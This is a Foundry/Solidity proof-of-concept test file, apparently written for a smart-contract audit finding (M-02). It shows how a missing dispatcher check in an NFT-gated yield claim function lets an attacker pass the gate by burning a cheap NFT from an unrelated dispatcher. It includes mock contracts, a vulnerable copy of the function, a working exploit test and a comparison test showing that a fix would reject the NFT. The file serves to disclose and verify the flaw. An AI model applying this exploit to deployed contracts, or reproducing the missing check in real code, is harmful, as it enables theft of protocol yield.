// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/**
 * @title M-02 PoC: NFT index validation does not verify dispatcher corresponds to this contract
 * @notice STANDALONE POC - No external dependencies required
 *
 * @dev Vulnerability Location: StableYieldAccumulator.sol#L472-L489
 *      https://github.com/.../src/StableYieldAccumulator.sol#L472-L489
 *
 * VULNERABILITY SUMMARY:
 * The `_validateAndBurnNFT` function accepts an arbitrary `nftIndex` and uses it to look up
 * a dispatcher config from the NFTMinter. It checks `dispatcher != address(0)` and
 * `balanceOf(caller, tokenId) > 0`, then burns 1 unit. But it does NOT verify that the
 * dispatcher at that index is specifically authorized for StableYieldAccumulator claims.
 *
 * Since NFTMinter is a protocol-wide ERC1155 system with multiple dispatchers, NFTs from
 * unrelated (potentially cheaper) dispatchers could satisfy the claim gate.
 *
 * ATTACK PATH:
 * 1. NFTMinter has dispatcher 1 registered for SYA claims (expensive, e.g., 100 USDC)
 * 2. NFTMinter has dispatcher 2 registered for something else (cheap, e.g., 1 USDC)
 * 3. Attacker mints cheap NFT from dispatcher 2
 * 4. Attacker calls SYA.claim(2) passing the cheap dispatcher's index
 * 5. _validateAndBurnNFT looks up configs(2), finds a valid dispatcher, burns the cheap NFT
 * 6. Claim succeeds despite using an NFT from the wrong dispatcher
 */

// ============ INLINED INTERFACES ============

interface IERC1155Minimal {
    function balanceOf(address account, uint256 id) external view returns (uint256);
}

// ============ MOCK NFT MINTER (ERC1155 + dispatcher configs) ============

/**
 * @notice Simplified NFTMinter mock that supports multiple dispatchers
 * @dev Mirrors the real NFTMinter's dispatcher config system and ERC1155 token management
 */
contract MockNFTMinter {
    struct DispatcherConfig {
        address dispatcher;
        uint256 price;
        uint256 growthBasisPoints;
    }

    uint256 public nextIndex = 1;
    mapping(uint256 => DispatcherConfig) public configsMap;
    mapping(address => uint256) public dispatcherToIndex;
    mapping(address => uint256) public dispatcherTokenIdOverride;
    mapping(address => bool) public authorizedBurners;

    // ERC1155 balances: account => tokenId => balance
    mapping(address => mapping(uint256 => uint256)) public balances;

    // Track burns for verification
    uint256 public totalBurns;
    uint256 public lastBurnTokenId;

    function registerDispatcher(address dispatcher, uint256 price, uint256 growth) external returns (uint256 index) {
        index = nextIndex++;
        configsMap[index] = DispatcherConfig(dispatcher, price, growth);
        dispatcherToIndex[dispatcher] = index;
    }

    function configs(uint256 index) external view returns (address dispatcher, uint256 price, uint256 growthBasisPoints) {
        DispatcherConfig memory cfg = configsMap[index];
        return (cfg.dispatcher, cfg.price, cfg.growthBasisPoints);
    }

    function setAuthorizedBurner(address burner, bool authorized) external {
        authorizedBurners[burner] = authorized;
    }

    // Simplified mint: directly credit balance
    function mintTo(address to, uint256 tokenId, uint256 amount) external {
        balances[to][tokenId] += amount;
    }

    function burn(address holder, uint256 tokenId, uint256 quantity) external {
        require(authorizedBurners[msg.sender], "Not authorized burner");
        require(balances[holder][tokenId] >= quantity, "Insufficient balance");
        balances[holder][tokenId] -= quantity;
        totalBurns++;
        lastBurnTokenId = tokenId;
    }

    // ERC1155 balanceOf
    function balanceOf(address account, uint256 id) external view returns (uint256) {
        return balances[account][id];
    }

    // Stub: supportsInterface for ERC1155
    function supportsInterface(bytes4) external pure returns (bool) {
        return true;
    }
}

// ============ MOCK CONTRACTS FOR SYA DEPENDENCIES ============

contract SimpleMockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (allowance[from][msg.sender] != type(uint256).max) {
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

contract SimpleMockPhlimbo {
    address public rewardToken;
    uint256 public lastCollectedAmount;

    constructor(address _rewardToken) {
        rewardToken = _rewardToken;
    }

    function collectReward(uint256 amount) external {
        // Pull tokens from caller (SYA)
        SimpleMockERC20(rewardToken).transferFrom(msg.sender, address(this), amount);
        lastCollectedAmount = amount;
    }
}

contract SimpleMockYieldStrategy {
    mapping(address => mapping(address => uint256)) public principals;
    mapping(address => mapping(address => uint256)) public yields;

    function setBalances(address token, address account, uint256 principal, uint256 yieldAmount) external {
        principals[token][account] = principal;
        yields[token][account] = yieldAmount;
    }

    function totalBalanceOf(address token, address account) external view returns (uint256) {
        return principals[token][account] + yields[token][account];
    }

    function principalOf(address token, address account) external view returns (uint256) {
        return principals[token][account];
    }

    function withdrawFrom(address token, address, uint256 amount, address recipient) external {
        SimpleMockERC20(token).transfer(recipient, amount);
    }
}

// ============ SIMPLIFIED VULNERABLE CONTRACT ============

/**
 * @notice Simplified StableYieldAccumulator showing the vulnerable _validateAndBurnNFT pattern
 * @dev Extracted from StableYieldAccumulator.sol - only the relevant claim + NFT validation logic
 *      The vulnerability: _validateAndBurnNFT does NOT check that the dispatcher at `index`
 *      is authorized specifically for SYA claims.
 */
contract VulnerableSYA {
    error NoValidNFT();
    error ZeroAddress();
    error ZeroAmount();

    struct TokenConfig {
        uint8 decimals;
        uint256 normalizedExchangeRate;
        bool paused;
    }

    address public nftMinter;
    address public phlimbo;
    address public rewardToken;
    address public minterAddress;
    uint256 public discountRate;

    address[] public yieldStrategies;
    mapping(address => address) public strategyTokens;
    mapping(address => TokenConfig) public tokenConfigs;

    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function setNFTMinter(address _nftMinter) external onlyOwner {
        nftMinter = _nftMinter;
    }

    function setPhlimbo(address _phlimbo) external onlyOwner {
        phlimbo = _phlimbo;
    }

    function setRewardToken(address _rewardToken) external onlyOwner {
        rewardToken = _rewardToken;
    }

    function setMinterAddress(address _minterAddress) external onlyOwner {
        minterAddress = _minterAddress;
    }

    function setDiscountRate(uint256 _discountRate) external onlyOwner {
        discountRate = _discountRate;
    }

    function addYieldStrategy(address strategy, address token, uint8 _decimals, uint256 exchangeRate) external onlyOwner {
        yieldStrategies.push(strategy);
        strategyTokens[strategy] = token;
        tokenConfigs[token] = TokenConfig(_decimals, exchangeRate, false);
    }

    function setTokenConfig(address token, uint8 _decimals, uint256 exchangeRate) external onlyOwner {
        tokenConfigs[token] = TokenConfig(_decimals, exchangeRate, false);
    }

    function approvePhlimbo(uint256 amount) external onlyOwner {
        SimpleMockERC20(rewardToken).approve(phlimbo, amount);
    }

    /**
     * @notice Claims all pending yield - accepts nftIndex parameter
     * @dev Reproduced from StableYieldAccumulator.sol lines 422-464
     */
    function claim(uint256 nftIndex) external {
        if (phlimbo == address(0)) revert ZeroAddress();
        if (rewardToken == address(0)) revert ZeroAddress();
        if (minterAddress == address(0)) revert ZeroAddress();

        // NFT gate: the vulnerable function
        _validateAndBurnNFT(msg.sender, nftIndex);

        uint256 totalNormalizedYield = 0;
        uint256 strategiesWithYield = 0;

        for (uint256 i = 0; i < yieldStrategies.length; i++) {
            address strategy = yieldStrategies[i];
            address token = strategyTokens[strategy];
            if (token == address(0)) continue;
            if (tokenConfigs[token].paused) continue;

            uint256 yield_ = _getYieldForStrategy(strategy, token);
            if (yield_ > 0) {
                SimpleMockYieldStrategy(strategy).withdrawFrom(token, minterAddress, yield_, msg.sender);
                totalNormalizedYield += _normalizeAmount(yield_, token);
                strategiesWithYield++;
            }
        }

        if (totalNormalizedYield == 0) revert ZeroAmount();

        uint256 claimerPayment = totalNormalizedYield * (10000 - discountRate) / 10000;
        uint256 actualPayment = _denormalizeAmount(claimerPayment, rewardToken);

        SimpleMockERC20(rewardToken).transferFrom(msg.sender, address(this), actualPayment);
        SimpleMockPhlimbo(phlimbo).collectReward(actualPayment);
    }

    /**
     * @notice THE VULNERABLE FUNCTION - copied verbatim from StableYieldAccumulator.sol#L472-L489
     * @dev Does NOT verify that the dispatcher at `index` is authorized for SYA claims.
     *      Any valid dispatcher index in the NFTMinter will pass the check.
     */
    function _validateAndBurnNFT(address caller, uint256 index) internal {
        require(nftMinter != address(0), "NFT minter not configured");
        MockNFTMinter minter = MockNFTMinter(nftMinter);

        (address dispatcher, , ) = minter.configs(index);
        if (dispatcher == address(0)) revert NoValidNFT();

        uint256 tokenId = minter.dispatcherTokenIdOverride(dispatcher);
        if (tokenId == 0) {
            tokenId = index;
        }

        if (minter.balanceOf(caller, tokenId) > 0) {
            minter.burn(caller, tokenId, 1);
        } else {
            revert NoValidNFT();
        }
    }

    function _getYieldForStrategy(address strategy, address token) internal view returns (uint256) {
        uint256 totalBalance = SimpleMockYieldStrategy(strategy).totalBalanceOf(token, minterAddress);
        uint256 principal = SimpleMockYieldStrategy(strategy).principalOf(token, minterAddress);
        if (totalBalance > principal) {
            return totalBalance - principal;
        }
        return 0;
    }

    function _normalizeAmount(uint256 amount, address token) internal view returns (uint256) {
        TokenConfig memory config = tokenConfigs[token];
        if (config.decimals == 18) return amount * config.normalizedExchangeRate / 1e18;
        if (config.decimals < 18) {
            return amount * 10 ** (18 - config.decimals) * config.normalizedExchangeRate / 1e18;
        }
        return amount / 10 ** (config.decimals - 18) * config.normalizedExchangeRate / 1e18;
    }

    function _denormalizeAmount(uint256 normalizedAmount, address token) internal view returns (uint256) {
        TokenConfig memory config = tokenConfigs[token];
        if (config.decimals == 18) return normalizedAmount * 1e18 / config.normalizedExchangeRate;
        if (config.decimals < 18) {
            return normalizedAmount / 10 ** (18 - config.decimals) * 1e18 / config.normalizedExchangeRate;
        }
        return normalizedAmount * 10 ** (config.decimals - 18) * 1e18 / config.normalizedExchangeRate;
    }
}

// ============ PROOF OF CONCEPT TEST ============

contract M02PoCTest is Test {

    // ============ CONTRACTS ============
    MockNFTMinter nftMinter;
    VulnerableSYA sya;
    SimpleMockERC20 rewardToken;    // USDC (6 decimals sim)
    SimpleMockERC20 strategyToken;  // USDT
    SimpleMockYieldStrategy yieldStrategy;
    SimpleMockPhlimbo phlimbo;

    // ============ ACTORS ============
    address owner;
    address attacker = makeAddr("attacker");
    address minterAddr = makeAddr("minter");

    // ============ DISPATCHERS ============
    address syaDispatcher = makeAddr("syaDispatcher");      // Dispatcher 1: expensive SYA claim NFTs
    address cheapDispatcher = makeAddr("cheapDispatcher");   // Dispatcher 2: cheap/unrelated NFTs

    uint256 syaDispatcherIndex;
    uint256 cheapDispatcherIndex;

    function setUp() public {
        owner = address(this);

        // Deploy core contracts
        rewardToken = new SimpleMockERC20("USDC", "USDC");
        strategyToken = new SimpleMockERC20("USDT", "USDT");
        yieldStrategy = new SimpleMockYieldStrategy();
        phlimbo = new SimpleMockPhlimbo(address(rewardToken));
        nftMinter = new MockNFTMinter();

        // Deploy vulnerable SYA
        sya = new VulnerableSYA();

        // Configure SYA
        sya.setNFTMinter(address(nftMinter));
        sya.setPhlimbo(address(phlimbo));
        sya.setRewardToken(address(rewardToken));
        sya.setMinterAddress(minterAddr);
        sya.setDiscountRate(200); // 2% discount
        sya.approvePhlimbo(type(uint256).max);

        // Register yield strategy with token config (18 decimals, 1:1 exchange rate)
        sya.addYieldStrategy(address(yieldStrategy), address(strategyToken), 18, 1e18);

        // Set reward token config (needed for _denormalizeAmount in claim payment calculation)
        sya.setTokenConfig(address(rewardToken), 18, 1e18);

        // Authorize SYA as a burner on NFTMinter
        nftMinter.setAuthorizedBurner(address(sya), true);

        // ============ REGISTER TWO DISPATCHERS ============

        // Dispatcher 1: SYA claim dispatcher (expensive NFTs, e.g., 100 USDC each)
        syaDispatcherIndex = nftMinter.registerDispatcher(syaDispatcher, 100e6, 0);

        // Dispatcher 2: Cheap/unrelated dispatcher (e.g., 1 USDC or free promotional NFTs)
        cheapDispatcherIndex = nftMinter.registerDispatcher(cheapDispatcher, 1e6, 0);

        // Fund yield strategy with tokens to withdraw
        strategyToken.mint(address(yieldStrategy), 1000e18);
        yieldStrategy.setBalances(address(strategyToken), minterAddr, 500e18, 100e18);

        // Fund attacker with reward tokens for the claim payment
        rewardToken.mint(attacker, 1000e18);
    }

    /**
     * @notice Main PoC: attacker uses cheap dispatcher's NFT to pass SYA's claim gate
     */
    function test_M02_CheapNFTBypassesClaimGate() public {
        console.log("=== M-02 PoC: NFT Index Validation Missing Dispatcher Check ===");
        console.log("");

        // Step 1: Verify the two dispatchers are registered with different prices
        (address d1, uint256 price1, ) = nftMinter.configs(syaDispatcherIndex);
        (address d2, uint256 price2, ) = nftMinter.configs(cheapDispatcherIndex);

        console.log("Step 1: Two dispatchers registered in NFTMinter");
        console.log("  SYA Dispatcher (index %d): price = %d", syaDispatcherIndex, price1);
        console.log("  Cheap Dispatcher (index %d): price = %d", cheapDispatcherIndex, price2);
        assertEq(d1, syaDispatcher, "SYA dispatcher registered");
        assertEq(d2, cheapDispatcher, "Cheap dispatcher registered");
        assertTrue(price1 > price2, "SYA NFTs are more expensive than cheap NFTs");

        // Step 2: Attacker gets a cheap NFT (from dispatcher 2)
        // In reality, this would be minted through the cheap dispatcher at 1 USDC
        // The tokenId defaults to the dispatcher index when no override is set
        uint256 cheapTokenId = cheapDispatcherIndex;
        nftMinter.mintTo(attacker, cheapTokenId, 1);

        console.log("");
        console.log("Step 2: Attacker mints 1 cheap NFT (tokenId = %d) from cheap dispatcher", cheapTokenId);
        assertEq(nftMinter.balanceOf(attacker, cheapTokenId), 1, "Attacker holds cheap NFT");

        // Verify attacker does NOT have the expensive SYA NFT
        uint256 syaTokenId = syaDispatcherIndex;
        assertEq(nftMinter.balanceOf(attacker, syaTokenId), 0, "Attacker does NOT hold SYA NFT");
        console.log("  Attacker does NOT hold any SYA NFTs (tokenId = %d)", syaTokenId);

        // Step 3: Attacker calls claim() with the cheap dispatcher's index
        console.log("");
        console.log("Step 3: Attacker calls SYA.claim(%d) using cheap dispatcher index", cheapDispatcherIndex);

        uint256 attackerRewardBefore = rewardToken.balanceOf(attacker);
        uint256 attackerStrategyBefore = strategyToken.balanceOf(attacker);

        vm.startPrank(attacker);
        rewardToken.approve(address(sya), type(uint256).max);
        sya.claim(cheapDispatcherIndex);  // <-- Uses cheap dispatcher index!
        vm.stopPrank();

        // Step 4: Verify the claim succeeded
        uint256 attackerStrategyAfter = strategyToken.balanceOf(attacker);
        uint256 attackerRewardAfter = rewardToken.balanceOf(attacker);

        console.log("");
        console.log("Step 4: Verify claim succeeded with wrong NFT type");
        console.log("  Strategy tokens received: %d", attackerStrategyAfter - attackerStrategyBefore);
        console.log("  Reward tokens paid: %d", attackerRewardBefore - attackerRewardAfter);
        console.log("  Cheap NFT was burned (balance now: %d)", nftMinter.balanceOf(attacker, cheapTokenId));

        // CRITICAL ASSERTIONS
        // The claim succeeded - attacker received yield tokens
        assertTrue(attackerStrategyAfter > attackerStrategyBefore, "VULN: Attacker received yield using cheap NFT");

        // The cheap NFT was burned (not the expensive SYA NFT)
        assertEq(nftMinter.balanceOf(attacker, cheapTokenId), 0, "Cheap NFT was burned");
        assertEq(nftMinter.lastBurnTokenId(), cheapTokenId, "Burn was on cheap tokenId, not SYA tokenId");

        // The expensive SYA NFT was never required
        assertEq(nftMinter.balanceOf(attacker, syaTokenId), 0, "SYA NFT was never needed");

        console.log("");
        console.log("=== VULNERABILITY CONFIRMED ===");
        console.log("Attacker bypassed the SYA claim gate using a cheap NFT from an unrelated dispatcher.");
        console.log("The _validateAndBurnNFT function does not verify the dispatcher is authorized for SYA.");
    }

    /**
     * @notice Comparison test: shows that a proper check WOULD reject the cheap NFT
     * @dev Demonstrates what the fix should look like
     */
    function test_M02_ProperCheckWouldReject() public {
        console.log("=== M-02 Comparison: What a proper dispatcher check would do ===");
        console.log("");

        // The fix would be to store the expected dispatcher index in SYA
        // and verify: require(dispatcher == expectedSYADispatcher, "Wrong dispatcher")

        // Cheap NFT from dispatcher 2
        uint256 cheapTokenId = cheapDispatcherIndex;
        nftMinter.mintTo(attacker, cheapTokenId, 1);

        // Look up the dispatcher for the cheap index
        (address dispatcher, , ) = nftMinter.configs(cheapDispatcherIndex);

        // A proper check would verify the dispatcher matches SYA's expected dispatcher
        bool isAuthorizedForSYA = (dispatcher == syaDispatcher);

        console.log("Dispatcher at cheap index: %s", dispatcher);
        console.log("Expected SYA dispatcher:   %s", syaDispatcher);
        console.log("Would pass proper check:   %s", isAuthorizedForSYA ? "YES" : "NO");

        assertFalse(isAuthorizedForSYA, "Cheap dispatcher should NOT pass a proper SYA check");

        console.log("");
        console.log("=== A proper dispatcher validation would reject this NFT ===");
    }
}
